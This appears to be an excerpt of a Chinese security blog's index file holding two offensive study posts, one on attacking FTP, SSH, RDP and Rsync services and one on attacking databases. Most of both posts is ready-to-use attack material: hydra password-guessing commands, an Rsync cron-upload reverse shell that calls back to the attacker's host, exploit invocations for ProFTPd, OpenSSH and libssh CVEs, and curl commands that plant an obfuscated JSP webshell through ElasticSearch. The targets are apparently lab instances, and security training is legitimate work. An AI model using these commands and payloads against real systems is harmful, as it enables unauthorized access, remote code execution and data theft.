        <content type="html"><![CDATA[<blockquote></blockquote><h2 id="应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解"><a href="#应用协议-amp-Rsync-amp-SSH-amp-RDP-amp-FTP-amp-漏洞批扫-amp-口令猜解" class="headerlink" title="应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"></a>应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</h2><h4 id="用hydra爆破（弱口令爆破）"><a href="#用hydra爆破（弱口令爆破）" class="headerlink" title="用hydra爆破（弱口令爆破）"></a>用hydra爆破（弱口令爆破）</h4><p>FTP（端口：21）：文本传输协议  （用户名随机）</p><p>RDP（端口：3389）,SSH（端口：22）：windows,linux上的远程传输协议</p><p>RDP用户名（一般是administrator） SSH用户名(一般是root)</p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>用hydra爆破</p><pre><code>-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。</code></pre><pre><code>hydra -L test -P 10top1K.txt 目标IP ftp -Vhydra -l root -P 10top1K.txt 目标IP ssh -Vhydra -l administrator -P 10top1K.txt 目标IP rdp -V</code></pre><p>L： 指定用户名字典   l：指定用户名  P：指定密码字典</p><h4 id="Rsync文件备份（未授权访问）"><a href="#Rsync文件备份（未授权访问）" class="headerlink" title="Rsync文件备份（未授权访问）"></a>Rsync文件备份（未授权访问）</h4><p>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</p><pre><code>判断：rsync rsync://目标IP利用：-读取文件：rsync rsync://目标IP/src/-下载文件：rsync rsync://目标IP/src/etc/passwd ./-上传文件：rsync -av passwd rsync://目标IP/src/tmp/passwd反弹shell：1、获取信息：rsync rsync://目标IP/src/etc/crontab /root/cron.txt2.创建文件 touch shell \#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/本地IP/5566 0&gt;&amp;1chmod +x shell        3、上传文件 rsync -av shell rsync://目标IP/src/etc/cron.hourly 4、等待接受反弹</code></pre><p>利用msf:auxiliary/scanner/rsync/modules_list</p><h4 id="协议漏洞-应用软件-FTP-amp-Proftpd搭建"><a href="#协议漏洞-应用软件-FTP-amp-Proftpd搭建" class="headerlink" title="协议漏洞-应用软件-FTP&amp;Proftpd搭建"></a>协议漏洞-应用软件-FTP&amp;Proftpd搭建</h4><pre><code>https://github.com/t0kx/exploit-CVE-2015-3306python exploit.py --host 123.58.236.76 --port 24967 --path "/var/www/html/"http://123.58.236.76:19758/backdoor.php?cmd=id</code></pre><h4 id="协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh"><a href="#协议漏洞-应用软件-SSH-amp-libssh-amp-Openssh" class="headerlink" title="协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><pre><code>-Openssh CVE-2014-0160 CVE-2018-15473 cve_2020_15778CVE-2014-0160 版本很少cve_2020_15778 价值不高CVE-2018-15473-用户名枚举https://github.com/Rhynorater/CVE-2018-15473-Exploitpip3 install -r requirements.txtpip3 install paramiko==2.4.1python sshUsernameEnumExploit.py --port 32013 --userList exampleInput.txt 123.58.236.76</code></pre><h4 id="libssh-身份验证绕过（CVE-2018-10933）"><a href="#libssh-身份验证绕过（CVE-2018-10933）" class="headerlink" title="libssh 身份验证绕过（CVE-2018-10933）"></a>libssh 身份验证绕过（CVE-2018-10933）</h4><pre><code>https://www.seebug.org/vuldb/ssvid-97614python libssh.py 123.58.236.76 55190 "id"</code></pre>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务攻防——数据库类型安全</title>
      <link href="/2022/03/04/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/"/>
      <url>/2022/03/04/fu-wu-gong-fang-shu-ju-ku-lei-xing-an-quan/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h4 id="服务攻防——数据库类型安全"><a href="#服务攻防——数据库类型安全" class="headerlink" title="服务攻防——数据库类型安全"></a>服务攻防——数据库类型安全</h4><p>1.influxdb-未授权访问-jwt验证</p><p>2.H2database-未授权访问-配置不当</p><p>3.CouchDB-权限绕过配合RCE-漏洞</p><p>4.ElasticSearch-文件写入&amp;RCE-漏洞</p><h5 id="1-influxdb-未授权访问-jwt验证"><a href="#1-influxdb-未授权访问-jwt验证" class="headerlink" title="1.influxdb-未授权访问-jwt验证"></a>1.influxdb-未授权访问-jwt验证</h5><p> 该数据库的默认端口：8086  8088</p><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。 借助jwt.io来生成jwt token</p><h5 id="2-H2-database-未授权访问-配置不当"><a href="#2-H2-database-未授权访问-配置不当" class="headerlink" title="2.H2 database-未授权访问-配置不当"></a>2.H2 database-未授权访问-配置不当</h5><p>默认端口：20051</p><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</p><pre><code>spring.h2.console.enabled=true spring.h2.console.settings.web-allow-others=true </code></pre><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><h5 id="3-CouchDB-权限绕过配合RCE-漏洞"><a href="#3-CouchDB-权限绕过配合RCE-漏洞" class="headerlink" title="3.CouchDB-权限绕过配合RCE-漏洞"></a>3.CouchDB-权限绕过配合RCE-漏洞</h5><p>默认端口：5984</p><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p><p>CouchDB-权限绕过-CVE-2017-12635</p><h5 id="4-ElasticSearch-文件写入-amp-RCE-漏洞"><a href="#4-ElasticSearch-文件写入-amp-RCE-漏洞" class="headerlink" title="4.ElasticSearch-文件写入&amp;RCE-漏洞"></a>4.ElasticSearch-文件写入&amp;RCE-漏洞</h5><p>Elasticsearch 文件写入 wooyun_2015_110216</p><p>9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用</p><p>1、发现9200端口存在elasticsearch页面，8080存在tomcat目录</p><p>2、利用ElasticSearch写入后门到/usr/local/tomcat/webapps/wwwroot/</p><pre><code>curl -XPOST http://123.58.236.76:31556/yz.jsp/yz.jsp/1 -d'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'curl -XPUT 'http://123.58.236.76:31556/_snapshot/yz.jsp' -d '{​     "type": "fs",​     "settings": {​          "location": "/usr/local/tomcat/webapps/wwwroot/",​          "compress": false​     }}'curl -XPUT "http://123.58.236.76:31556/_snapshot/yz.jsp/yz.jsp" -d '{​     "indices": "yz.jsp",​     "ignore_unavailable": "true",​     "include_global_state": false}'</code></pre><p>3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中</p><pre><code>http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=successhttp://123.58.236.76:31557/wwwroot/test.jsp</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shmily </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
